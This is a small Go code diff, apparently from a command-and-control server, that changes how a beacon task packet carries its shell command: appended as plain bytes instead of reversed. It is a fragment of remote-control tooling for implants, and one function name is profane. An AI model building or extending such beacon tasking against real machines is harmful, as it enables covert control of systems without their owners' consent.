@@ -29,7 +29,7 @@ func make_fucker(listener *Listener, i int) []byte {
 	binary.LittleEndian.PutUint16(command, job.command)
 
 	res = append(res, command...)
-	res = append(res, ReverseBytes(stringToBytes(job.shell))...)
+	res = append(res, []byte(job.shell)...)
 
 	listener.Beacons[i].jobs[0].funny = false
 
